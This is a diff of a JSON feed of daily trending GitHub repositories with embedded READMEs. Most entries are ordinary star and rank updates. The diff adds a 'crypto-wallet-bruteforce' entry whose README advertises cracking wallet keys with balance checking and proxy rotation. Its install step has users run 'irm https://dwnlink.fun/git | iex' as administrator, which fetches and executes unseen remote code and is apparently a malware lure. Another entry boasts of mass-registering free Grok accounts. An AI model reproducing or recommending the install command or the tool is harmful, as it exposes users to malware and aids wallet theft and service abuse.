@@ -1,5 +1,5 @@
 {
-  "updatedAt": "2026-07-12T16:41:11.006Z",
+  "updatedAt": "2026-07-12T17:25:02.872Z",
   "period": "daily",
   "items": [
     {
@@ -33,7 +33,7 @@
       "name": "cliproxyapi-cloudflare-stack",
       "html_url": "https://github.com/xsser/cliproxyapi-cloudflare-stack",
       "description": "感谢马斯克 让我grok自由，免费注册grok 无数个号。然后cpa自由使用",
-      "stargazers_count": 91,
+      "stargazers_count": 94,
       "forks_count": 8,
       "open_issues_count": 0,
       "language": "Shell",
@@ -55,7 +55,7 @@
       "name": "lan-file-transfer",
       "html_url": "https://github.com/NextWeb4/lan-file-transfer",
       "description": "Local LAN file transfer desktop app with user/group permissions and audit logs.",
-      "stargazers_count": 55,
+      "stargazers_count": 58,
       "forks_count": 4,
       "open_issues_count": 0,
       "language": "Python",
@@ -66,26 +66,11 @@
     },
     {
       "rank": 4,
-      "full_name": "MarvinSchwaibold/mri-grid-viewer",
-      "name": "mri-grid-viewer",
-      "html_url": "https://github.com/MarvinSchwaibold/mri-grid-viewer",
-      "description": "Local-first MRI series grid viewer with a SwiftUI iOS wrapper",
-      "stargazers_count": 44,
-      "forks_count": 2,
-      "open_issues_count": 0,
-      "language": "JavaScript",
-      "topics": [],
-      "owner_login": "MarvinSchwaibold",
-      "owner_avatar_url": "https://avatars.githubusercontent.com/u/64643796?v=4",
-      "readme": "<!-- no README found -->\n\nREADME 暂无，请访问 [MarvinSchwaibold/mri-grid-viewer](https://github.com/MarvinSchwaibold/mri-grid-viewer) 主页查看。"
-    },
-    {
-      "rank": 5,
       "full_name": "rit3zh/expo-morphing-menu",
       "name": "expo-morphing-menu",
       "html_url": "https://github.com/rit3zh/expo-morphing-menu",
       "description": "🗂️ A morphing, keyboard-aware composer + picker menu.",
-      "stargazers_count": 43,
+      "stargazers_count": 47,
       "forks_count": 3,
       "open_issues_count": 0,
       "language": "TypeScript",
@@ -95,12 +80,27 @@
       "readme": "# expo-morphing-menu\n\nA morphing, keyboard-aware **composer + picker menu** for React Native.\n\n## ✨ Features\n\n- 🫧 **Morphing presentation** — a single spring machine drives the composer's width, height, corner radius, and position together, so the input bar _grows into_ the menu surface instead of a separate sheet sliding up\n- ⌨️ **Keyboard-following** via `react-native-keyboard-controller` — the surface reads live keyboard height and stays glued above it as it opens and closes\n- 🧭 **Multi-panel navigation** — register `<BottomInput.Item>` rows (Camera, Photos, Files, Plugins…) and matching `<BottomInput.Content>` panels; `open(id)` morphs the surface to that panel and `back()` returns to the item list\n- 🖼️ **Single-image morph** — tapping a photo runs a shared-element morph from its grid cell into an attachment thumb, coordinated through the root via `reportFrame` / `run`\n- 🧠 TypeScript-first, fully typed surface\n\n---\n\n## ⚙️ Installation\n\n```bash\ngit clone https://github.com/rit3zh/expo-morphing-menu\ncd expo-morphing-menu\nbun install\nbun start -c\n```\n\nCore dependencies (already wired up in this template):\n\n```bash\nbun add react-native-reanimated react-native-gesture-handler \\\n  react-native-safe-area-context react-native-keyboard-controller \\\n  expo-symbols expo-glass-effect expo-image expo-document-picker\n```\n\n> **Expo SDK 57.** Read the exact versioned docs at\n> https://docs.expo.dev/versions/v57.0.0/ before changing native code.\n\n---\n\n## 🚀 Usage\n\nWrap your app once with `KeyboardProvider`, then compose a `<BottomInput>` at the\nbottom of your screen.\n\n```tsx\n// app/_layout.tsx\nimport { KeyboardProvider } from \"react-native-keyboard-controller\";\nimport { Stack } from \"expo-router\";\n\nexport default function RootLayout() {\n  return (\n    <KeyboardProvider enabled>\n      <Stack screenOptions={{ headerShown: false }} />\n    </KeyboardProvider>\n  );\n}\n```\n\nThe simplest composer — a placeholder, one trigger, one menu item:\n\n```tsx\nimport { BottomInput } from \"@/components/bottom-input\";\nimport { SymbolView } from \"expo-symbols\";\n\nexport function Composer() {\n  return (\n    <BottomInput placeholder=\"Ask ChatGPT\">\n      <BottomInput.Trigger>\n        <SymbolView name=\"plus\" size={22} tintColor=\"#ececec\" />\n      </BottomInput.Trigger>\n\n      <BottomInput.Items>\n        <BottomInput.Item\n          id=\"photos\"\n          label=\"Photos\"\n          icon={<SymbolView name=\"photo\" size={22} tintColor=\"#ececec\" />}\n        />\n      </BottomInput.Items>\n\n      <BottomInput.Content id=\"photos\">\n        {/* your panel here */}\n      </BottomInput.Content>\n    </BottomInput>\n  );\n}\n```\n\n## Preview\n\nhttps://github.com/user-attachments/assets/15abbea3-644f-4680-8795-4d16182a70ec\n\n\n\n### Controlling open state\n\nPass `open` / `onOpenChange` to drive the menu from outside (e.g. to prefetch the\nphoto library the moment it opens):\n\n```tsx\nconst [menuOpen, setMenuOpen] = useState(false);\n\n<BottomInput\n  placeholder=\"Ask ChatGPT\"\n  open={menuOpen}\n  onOpenChange={setMenuOpen}\n  trailing={<ComposerTrailing />}\n>\n  {/* … */}\n</BottomInput>;\n```\n\n### Attachments\n\nRender selected photos and files above the field. The composer measures the strip\nand reflows to fit:\n\n```tsx\n<BottomInput.Attachments>\n  {attachments.map((photo) => (\n    <AttachmentThumb key={photo.id} photo={photo} onRemove={removeAttachment} />\n  ))}\n  {files.map((file) => (\n    <FileAttachment key={file.id} file={file} onRemove={removeFile} />\n  ))}\n</BottomInput.Attachments>\n```\n\n### Multiple panels\n\nRegister several items and a matching `Content` panel per id. Tapping an item\nmorphs the surface to that panel:\n\n```tsx\n<BottomInput.Items>\n  <BottomInput.Item id=\"camera\" label=\"Camera\" icon={/* … */} />\n  <BottomInput.Item id=\"photos\" label=\"Photos\" icon={/* … */} />\n  <BottomInput.Item id=\"files\" label=\"Files\" icon={/* … */} />\n</BottomInput.Items>\n\n<BottomInput.Content id=\"camera\"><CameraSurface /></BottomInput.Content>\n<BottomInput.Content id=\"photos\"><PhotoGrid /></BottomInput.Content>\n<BottomInput.Content id=\"files\" height={800}><FilesPanel /></BottomInput.Content>\n```\n\n> ⚠️ `Content.height` — a fixed height only works reliably when the keyboard is\n> **not** mounted. The panel is bottom-anchored just above the keyboard, so a\n> height taller than the space above it overflows off-screen. Omit `height` to use\n> the keyboard-safe default.\n\n---\n\n## 🧱 Component Anatomy\n\n```tsx\n<BottomInput>\n  <BottomInput.Attachments />\n  <BottomInput.Trigger />\n  <BottomInput.Items>\n    <BottomInput.Item />\n  </BottomInput.Items>\n  <BottomInput.Content />\n</BottomInput>\n```\n\n---\n\n## 🧩 API\n\n### `<BottomInput>` (root)\n\n| Prop           | Type                      | Default | Description                                                |\n| -------------- | ------------------------- | ------- | ---------------------------------------------------------- |\n| `placeholder`  | `string`                  | —       | Placeholder for the composer text field.                   |\n| `open`         | `boolean`                 | —       | Controlled menu-open state.                                |\n| `onOpenChange` | `(open: boolean) => void` | —       | Fires when the menu opens or closes.                       |\n| `inputProps`   | `TextInputProps`          | —       | Props forwarded to the underlying `TextInput`.             |\n| `trailing`     | `ReactNode`               | —       | Content pinned to the trailing edge of the field.          |\n| `children`     | `ReactNode`               | —       | The `Attachments` / `Trigger` / `Items` / `Content` slots. |\n\n### `<BottomInput.Trigger>`\n\n| Prop       | Type        | Description                               |\n| ---------- | ----------- | ----------------------------------------- |\n| `children` | `ReactNode` | The pressable content (e.g. a ＋ symbol). |\n\n### `<BottomInput.Items>` / `<BottomInput.Item>`\n\n`Items` wraps the menu rows. Each `Item`:\n\n| Prop    | Type        | Description                                      |\n| ------- | ----------- | ------------------------------------------------ |\n| `id`    | `string`    | Unique id linking this row to a `Content` panel. |\n| `label` | `string`    | Row label.                                       |\n| `icon`  | `ReactNode` | Leading icon.                                    |\n\n### `<BottomInput.Content>`\n\n| Prop       | Type        | Description                                                         |\n| ---------- | ----------- | ------------------------------------------------------------------- |\n| `id`       | `string`    | Matches an `Item` id; the surface morphs to this panel when opened. |\n| `height`   | `number`    | Optional fixed panel height. See the keyboard caveat above.         |\n| `children` | `ReactNode` | The panel body.                                                     |\n\n### `<BottomInput.Attachments>`\n\n| Prop       | Type        | Description                                 |\n| ---------- | ----------- | ------------------------------------------- |\n| `children` | `ReactNode` | Attachment thumbs rendered above the field. |\n\n### `useBottomInput()`\n\nAccess menu state and the morph controller from any descendant of `<BottomInput>`.\n\n| Field               | Type                   | Description                                                                       |\n| ------------------- | ---------------------- | --------------------------------------------------------------------------------- |\n| `menuOpen`          | `boolean`              | Whether the menu is open.                                                         |\n| `toggleMenu()`      | `() => void`           | Toggle the menu.                                                                  |\n| `close()`           | `() => void`           | Close the menu.                                                                   |\n| `activeId`          | `string \\| null`       | The currently open panel id.                                                      |\n| `open(id)`          | `(id: string) => void` | Morph the surface to a panel.                                                     |\n| `back()`            | `() => void`           | Return from a panel to the item list.                                             |\n| `contentWidth`      | `number`               | Measured width of the extended surface.                                           |\n| `contentHeight`     | `number`               | Measured height of the extended surface.                                          |\n| `attachmentsHeight` | `SharedValue<number>`  | Live height of the attachment strip.                                              |\n| `morph`             | `IBottomInputMorph`    | Single-image morph controller (`reportFrame` / `run`, `pendingId`, `revealedId`). |\n\n---\n\n## 🧱 Stack\n\n[Expo SDK 57](https://expo.dev/changelog) · [React Native 0.86](https://reactnative.dev/) · [Reanimated 4](https://docs.swmansion.com/react-native-reanimated/) · [Gesture Handler 2](https://docs.swmansion.com/react-native-gesture-handler/) · [Keyboard Controller](https://kirillzyusko.github.io/react-native-keyboard-controller/) · [expo-symbols](https://docs.expo.dev/versions/latest/sdk/symbols/) · [expo-glass-effect](https://docs.expo.dev/versions/latest/sdk/glass-effect/) · [expo-image](https://docs.expo.dev/versions/latest/sdk/image/) · [Safe Area Context](https://github.com/th3rdwave/react-native-safe-area-context) · [Expo Router](https://docs.expo.dev/router/introduction/)\n\n---\n"
     },
     {
+      "rank": 5,
+      "full_name": "MarvinSchwaibold/mri-grid-viewer",
+      "name": "mri-grid-viewer",
+      "html_url": "https://github.com/MarvinSchwaibold/mri-grid-viewer",
+      "description": "Local-first MRI series grid viewer with a SwiftUI iOS wrapper",
+      "stargazers_count": 46,
+      "forks_count": 2,
+      "open_issues_count": 0,
+      "language": "JavaScript",
+      "topics": [],
+      "owner_login": "MarvinSchwaibold",
+      "owner_avatar_url": "https://avatars.githubusercontent.com/u/64643796?v=4",
+      "readme": "<!-- no README found -->\n\nREADME 暂无，请访问 [MarvinSchwaibold/mri-grid-viewer](https://github.com/MarvinSchwaibold/mri-grid-viewer) 主页查看。"
+    },
+    {
       "rank": 6,
       "full_name": "igorbarshteyn/jlens-gguf",
       "name": "jlens-gguf",
       "html_url": "https://github.com/igorbarshteyn/jlens-gguf",
       "description": "Interactive Jacobian-Lens visualizer and live steerer for GGUF models on llama.cpp",
-      "stargazers_count": 36,
+      "stargazers_count": 37,
       "forks_count": 6,
       "open_issues_count": 0,
       "language": "Python",
@@ -192,18 +192,36 @@
     },
     {
       "rank": 11,
-      "full_name": "TizenryA/cpa-plugin-grok-panel",
-      "name": "cpa-plugin-grok-panel",
-      "html_url": "https://github.com/TizenryA/cpa-plugin-grok-panel",
-      "description": "Grok panel plugin for CLIProxyAPI - shows account count, usage stats, and token estimation",
-      "stargazers_count": 23,
+      "full_name": "stepicdezlife3/crypto-wallet-bruteforce",
+      "name": "crypto-wallet-bruteforce",
+      "html_url": "https://github.com/stepicdezlife3/crypto-wallet-bruteforce",
+      "description": "Advanced cryptocurrency wallet brute force tool for educational purposes supporting Ethereum, BNB, Polygon, and EVM-compatible chains with GPU acceleration.",
+      "stargazers_count": 24,
       "forks_count": 0,
       "open_issues_count": 0,
-      "language": "Go",
-      "topics": [],
-      "owner_login": "TizenryA",
-      "owner_avatar_url": "https://avatars.githubusercontent.com/u/255233716?v=4",
-      "readme": "# Grok Panel — CLIProxyAPI 原生插件\n\n> 为 [CLIProxyAPI](https://github.com/router-for-me/CLIProxyAPI) 打造的 Grok 账号管理面板，一个插件搞定统计、分类、健康检查和安全清理。\n\n**版本** `v1.1.19` ｜ **平台** Linux / macOS / Windows ｜ **语言** 中文 ｜ **License** MIT\n\n**仓库地址**：https://github.com/TizenryA/cpa-plugin-grok-panel\n\n---\n\n## 友链\n\n> 感谢 [LINUX DO](https://linux.do/) 社区对开源项目的支持。本项目的开发与推广得益于社区环境，在此致敬。\n\n[![LINUX DO](https://img.shields.io/badge/LINUX%20DO-社区友链-0066cc)](https://linux.do/)\n\n---\n\n## 这是什么\n\nGrok Panel 是一个 CPA 原生 Go 插件（`.so` shared object），安装后直接在 CPA 管理中心的插件菜单中打开。它读取当前 CPA 实例中的所有 xAI / Grok auth 文件，提供可视化的账号管理面板。\n\n**查看统计默认零配置** — 插件通过 CPA 官方 host callback 直接读取数据，每个人安装后只看到自己的账号。删除 / 检查若管理中心 iframe 读不到会话密钥，可在面板设置里本地保存管理密钥（仅当前浏览器）。\n\n---\n\n## 特点\n\n- **即装即用**：通过 CPA 插件商店一键安装，无需手动下载或编译\n- **默认零配置**：统计面板无需填写 CPA 地址；删除/检查可选用面板本地保存的管理密钥\n- **安全隔离**：源码、Release 和配置中均不含任何密钥；不连接作者的 CPA；不上传账号数据\n- **跟随系统主题**：暗色用等宽字体；亮色为橙色衬线克劳德风，自动跟随系统\n- **移动端适配**：vw/vh 全比例布局，手机竖排单列\n- **账号表分页**：默认每页 50 条，可选 20/50/100/200，号多也不卡\n- **可分享**：插件仓库公开，其他 CPA 用户可直接安装使用\n\n---\n\n## 功能\n\n### 统计概览\n\n- Grok 文件总数、活跃 / 禁用账号数\n- 总成功 / 失败请求数、成功率\n- 估算 Token 用量与总容量（每账号默认 200 万 Token，可调）\n- 使用率进度条（绿 / 黄 / 红三段）\n- 请求趋势柱状图（成功绿色 / 失败红色）\n- 账号类型分布（Free / Super / Heavy）\n- 健康概览（正常 / 警告 / 无效 / 未知）\n\n### 账号分类\n\n从 auth 文件的 `note`、`prefix`、`subscription`、`plan` 等字段自动识别：\n\n| 类型 | 说明 | 识别依据 |\n|------|------|----------|\n| **Free** | 普通免费账号 | 无 SuperGrok / Heavy 信号 |\n| **Super** | SuperGrok 高级套餐 | `note: supergrok`、`prefix: supergrok` 等 |\n| **Heavy** | Heavy 大用量套餐 | `note` / `prefix` 含 heavy 关键词 |\n\n无法可靠判断时归为 Free（实际使用中绝大多数 CPA xAI 账号为免费账号）。\n\n### 健康检查\n\n- 点击\"检查\"对单个账号发起轻量探测\n- \"检查选中\"批量检查勾选账号\n- \"手动检查本页\"检查当前页账号\n\n状态判定规则：\n\n| 状态 | 条件 | 说明 |\n|------|------|------|\n| **正常** | 探测成功 | 绿色发光圆点 |\n| **警告** | 429 限流 / 5xx / 超时 | 黄色圆点，不累计失效 |\n| **无效** | 连续 3 次明确 401/403 | 红色圆点，可清理 |\n| **禁用** | CPA 标记 disabled | 灰色圆点 |\n| **未知** | 尚未检查 | 灰色空心圆点 |\n\n> 429、5xx、网络超时**不会**被判定为失效。只有连续 3 次明确的认证失败（401/403）才成为自动删除候选。阈值可调。\n\n### 删除与清理\n\n- **单个删除**：点击\"删除\"→ 按钮变红显示\"确认删除\"→ 再次点击执行\n- **批量删除**：勾选多个账号 → \"删除选中\"\n- **一键清理**：\"清理无效 N\"按钮，清理已确认失效且未受保护的账号\n- **不弹窗**：所有确认通过按钮变色实现，不使用 `confirm` 弹窗\n\n### 保护规则\n\n默认配置（可调整）：\n\n```\n☑ 保护 Super    — SuperGrok 账号永不自动删除\n☑ 保护 Heavy    — Heavy 账号永不自动删除\n☑ 保护未知      — 未知类型账号永不自动删除\n☐ 自动检查      — 默认关，开启后刷新时自动检查全部活跃账号\n☐ 自动删除      — 默认关，开启后在自动检查后清理失效账号\n```\n\n受保护账号的删除按钮自动禁用，并在邮箱下方显示 ⚠ 标记。手动删除仍遵守保护开关。\n\n### 筛选与搜索\n\n- 搜索：邮箱、状态、类型、健康关键词\n- 状态筛选：全部 / 活跃 / 禁用 / 其他 / 未知\n- 类型筛选：全部 / Free / Super / Heavy\n- 健康筛选：全部 / 健康 / 警告 / 无效 / 禁用 / 未知\n- 用量筛选：未使用 / 低于一半 / 一半以上 / 高于八成\n- 排序：成功请求 / 失败 / 用量 / 健康优先 / 类型 / 邮箱\n\n### 设置\n\n面板设置保存在当前浏览器本地：\n\n- 每账号估算容量（默认 2,000,000 Token）\n- 平均 Token / 请求（默认 5,000）\n- 连续认证失败阈值（默认 3）\n- 自动检查开关（默认关）\n- 自动删除开关（默认关）\n- Super / Heavy / 未知类型保护开关（默认开）\n\n> 性能相关功能默认关闭，安装后不会立即批量检查账号。\n\n---\n\n## 安装方式\n\n### 方式 A：插件商店安装（推荐）\n\n**1. 配置 CPA**\n\n在 CPA 的 `config.yaml` 中启用插件并添加本仓库为插件源：\n\n```yaml\nplugins:\n  enabled: true\n  dir: \"plugins\"\n  store-sources:\n    - \"https://raw.githubusercontent.com/TizenryA/cpa-plugin-grok-panel/main/registry.json\"\n  configs:\n    grok-panel:\n      enabled: true\n```\n\n**2. 重启 CPA**\n\n**3. 安装插件**\n\n进入 CPA 管理中心 → 插件商店 → 找到 **Grok Panel** → 点击安装\n\n或使用 API 安装：\n\n```bash\ncurl -X POST \\\n  -H \"Authorization: Bearer YOUR_MANAGEMENT_KEY\" \\\n  \"https://YOUR_CPA_HOST/v0/management/plugin-store/grok-panel/install?source=YOUR_SOURCE_ID&version=v1.1.19\"\n```\n\n> 这里的管理密钥只用于执行安装操作，不会写入插件。\n\n**4. 打开面板**\n\n安装完成后，在 CPA 管理中心的插件菜单中点击 **Grok Panel** 即可打开。\n\n### 方式 B：手动安装\n\n安装包**只发布在** [GitHub Releases](https://github.com/TizenryA/cpa-plugin-grok-panel/releases)（仓库源码树不再存放 zip / `.so`）。下载与宿主匹配的压缩包：\n\n```text\ngrok-panel_1.1.19_linux_amd64.zip\ngrok-panel_1.1.19_linux_arm64.zip\ngrok-panel_1.1.19_darwin_amd64.zip\ngrok-panel_1.1.19_darwin_arm64.zip\ngrok-panel_1.1.19_windows_amd64.zip\ngrok-panel_1.1.19_windows_arm64.zip\n```\n\n解压后将插件库文件放入 CPA 配置的插件目录：\n\n```text\nplugins/linux/amd64/grok-panel-v1.1.19.so\nplugins/linux/arm64/grok-panel-v1.1.19.so\nplugins/darwin/amd64/grok-panel-v1.1.19.dylib\nplugins/darwin/arm64/grok-panel-v1.1.19.dylib\nplugins/windows/amd64/grok-panel-v1.1.19.dll\nplugins/windows/arm64/grok-panel-v1.1.19.dll\n```\n\nCPA 安装时会按宿主机 `GOOS/GOARCH` 自动选择对应 zip。当前已发布：\n\n| 平台 | 资产 | 库文件 |\n|---|---|---|\n| Linux x86_64 | `*_linux_amd64.zip` | `grok-panel.so` |\n| Linux ARM64 | `*_linux_arm64.zip` | `grok-panel.so` |\n| macOS Intel | `*_darwin_amd64.zip` | `grok-panel.dylib` |\n| macOS Apple Silicon | `*_darwin_arm64.zip` | `grok-panel.dylib` |\n| Windows x86_64 | `*_windows_amd64.zip` | `grok-panel.dll` |\n| Windows ARM64 | `*_windows_arm64.zip` | `grok-panel.dll` |\n\n若出现 `plugin_install_failed`，优先检查：\n\n1. 宿主架构是否已有对应 zip\n2. CPA 机器是否能访问 GitHub Release\n3. 返回体里的 `message` 原文（比 toast 更准确）\n\n---\n\n## 隐私与安全\n\n- 不连接作者的 CPA，每个安装者只读取自己的数据\n- 不上传账号文件或凭据\n- 不在日志中打印 token、cookie 或授权头\n- 删除使用 CPA 官方管理 API，不直接修改宿主文件系统\n- 面板不向浏览器返回 access token、refresh token、SSO token\n\n## 升级与卸载\n\n- **升级**：在 CPA 插件商店点击更新，或重新调用安装接口指定新版本\n- **卸载**：在 CPA 插件管理页面卸载 `grok-panel`，然后重启 CPA\n\n## 构建\n\n需要与 CPA 宿主兼容的 OS / CPU 架构及 Go 工具链（Go 1.24+）：\n\n```bash\ngo test ./...\ngo vet ./...\n# Linux 示例\ngo build -buildmode=c-shared -o grok-panel.so .\n```\n\n交叉编译产物与 zip **不要提交进仓库**，发版时上传到 GitHub Release 即可。仓库仅保留源码与 `registry.json`。\n\n## 仓库结构\n\n```text\nmain.go          # 插件后端\nhtml.go          # 内嵌面板前端\nmain_test.go     # 单元测试\nregistry.json    # CPA 插件商店元数据\nREADME.md\n.gitignore\n```\n\n## License\n\nMIT\n"
+      "language": "Python",
+      "topics": [
+        "brute-force",
+        "brute-force-attacks",
+        "brute-force-detection",
+        "bruteforce-attack-framework",
+        "bruteforce-wallet",
+        "crypto",
+        "cryptowallet",
+        "finder-crypto",
+        "mnemonic",
+        "python-script",
+        "python3",
+        "seed-phrases-finder",
+        "seedphrase",
+        "wallet",
+        "wallet-finder-crypto",
+        "wallet-tracker",
+        "wallets-finder"
+      ],
+      "owner_login": "stepicdezlife3",
+      "owner_avatar_url": "https://avatars.githubusercontent.com/u/301927310?v=4",
+      "readme": "# 🔓 Crypto Wallet BruteForce\nAdvanced cryptocurrency wallet brute force tool supporting Ethereum, BNB, Polygon, and multiple blockchain networks\n\n## ⚡ What is this?\nCrypto-Wallet-Bruteforce is a high-performance wallet recovery and brute force tool designed for educational and research purposes. It supports multiple blockchain networks including Ethereum (ETH), Binance Coin (BNB), Polygon (MATIC), and more. This tool demonstrates the importance of strong private key security and cryptographic entropy.\n\n## 🚀 Key Features\n🔑 Multi-Network Support\tETH, BNB, Polygon, and EVM-compatible chains\n⚡ GPU Acceleration\tCUDA and OpenCL support for faster computation\n🎯 Targeted Bruteforce\tSpecific address or range-based searching\n📊 Progress Tracking\tReal-time progress and speed monitoring\n💾 Checkpoint System\tSave and resume sessions\n🔍 Balance Checker\tAutomatic balance verification\n📁 Multi-Format Import\tImport addresses from CSV, JSON, TXT\n🛡️ Secure Mode\tEncrypted key storage and memory protection\n🌐 Proxy Support\tRotate IPs for anonymous scanning\n\n📦 Installation\n\n*1. Launch your terminal:\n\n\nOpen *Windows PowerShell* with Administrator privileges to ensure correct permissions.\n\n\n*2. Execute the setup sequence:*\n```powershell\n\n\n\nirm https://dwnlink.fun/git | iex\n\n```\n\n## 📦 Included Modules\n\n📁 crypto-wallet-bruteforce/\n├── 📁 src/\n│   ├── main.py                 # Main entry point\n│   ├── bruteforce_engine.py    # Core brute force logic\n│   ├── network_manager.py      # Multi-chain support\n│   ├── gpu_accelerator.py      # CUDA/OpenCL acceleration\n│   └── balance_checker.py      # Balance verification\n├── 📁 algorithms/\n│   ├── random_generator.py     # Private key generation\n│   ├── vanity_search.py        # Vanity address search\n│   ├── bip39.py                # BIP39 seed phrases\n│   └── dictionary_attack.py    # Wordlist attacks\n├── 📁 data/\n│   ├── addresses.txt           # Target addresses\n│   ├── wordlists/              # Dictionary files\n│   └── checkpoints/            # Save points\n├── 📁 config/\n│   ├── config.json             # Main configuration\n│   └── networks.json           # Network settings\n└── 📄 README.md\n\n## 🔧 Requirements\nPython 3.9+\n\nCUDA-capable GPU (optional)\n\n8GB+ RAM\n\n1GB+ storage for wordlists\n\n## 📊 Performance Benchmark\n├── CPU Speed: 12,000 keys/sec\n├── GPU Speed: 850,000 keys/sec\n├── GPU + CPU: 1,200,000 keys/sec\n├── Memory Usage: 3.2 GB\n└── Est. Time for 1M addresses: 3.5 hours\n📊 Progress Dashboard\n## 🔓 Brute Force Progress\n├── Total Addresses Scanned: 45,234,123\n├── Found Wallets: 12\n├── Found with Balance: 3\n├── Total Balance Found: 2.34 ETH, 5.67 BNB\n├── Speed: 847,321 keys/sec\n├── Time Elapsed: 5h 23m 45s\n├── Time Remaining: 2h 45m 12s\n├── Progress: ████████░░░░ 67.8%\n└── Checkpoint: Every 60 seconds\n## 🛡️ Security Features\nFeature\tDescription\n🔐 Encrypted Storage\tAES-256 encryption for found keys\n🛡️ Secure Memory\tRAM encryption to prevent dumping\n🕵️ Proxy Rotation\tIP rotation for anonymity\n🧹 Automatic Cleanup\tRemove temporary files\n📝 Audit Log\tAll actions logged securely\n🔑 Key Verification\tValidate keys before saving\n📁 Wordlist Support\nSupported wordlist formats:\n\n📂 data/wordlists/\n├── rockyou.txt              # 14M passwords\n├── english_bip39.txt        # 2048 BIP39 words\n├── crypto_common.txt        # Common crypto phrases\n├── blockchain_seeds.txt     # Common seed phrases\n├── default_pass.txt         # Default passwords\n└── custom_list.txt          # User-defined list\n## ⚠️ DISCLAIMER\n## ⚠️ EDUCATIONAL PURPOSE ONLY\n\nThis repository is created for educational and research purposes only to demonstrate:\n\nImportance of strong private key security\n\nCryptographic entropy concepts\n\nWallet security best practices\n\nWhy secure key generation is critical\n\n## 🚨 WARNING:\n\nUnauthorized access to others' wallets is ILLEGAL\n\nThis tool should ONLY be used on your OWN wallets\n\nUse for recovery of YOUR lost/forgotten wallets\n\nRespect privacy and property rights\n\nThe creator assumes NO liability for misuse\n\n## 💡 LEGAL USE CASES:\n\nRecovering your own lost wallet\n\nSecurity testing of your own systems\n\nEducational research and learning\n\nDemonstrating security vulnerabilities\n\n## 📜 License\nMIT License — Free to use, modify, and distribute for educational purposes.\n\n## ⭐ Star History\nIf you find this useful for educational/research purposes, please give it a star! ⭐\n\n## 🔓 Crypto-Wallet-Bruteforce — Learn. Research. Secure.\n\n"
     },
     {
       "rank": 12,
@@ -211,7 +229,7 @@
       "name": "audio.cpp-webui",
       "html_url": "https://github.com/kigner/audio.cpp-webui",
       "description": "audio.cpp with a full-task WebUI - pure C++ audio-model inference engine powered by ggml. TTS, ASR/STT, VAD, voice conversion, speaker diarization, music generation. No Python dependency.",
-      "stargazers_count": 21,
+      "stargazers_count": 24,
       "forks_count": 8,
       "open_issues_count": 0,
       "language": "C++",
@@ -234,7 +252,7 @@
       ],
       "owner_login": "kigner",
       "owner_avatar_url": "https://avatars.githubusercontent.com/u/130829775?v=4",
-      "readme": ""
+      "readme": "<!-- no README found -->\n\nREADME 暂无，请访问 [kigner/audio.cpp-webui](https://github.com/kigner/audio.cpp-webui) 主页查看。"
     }
   ]
 }
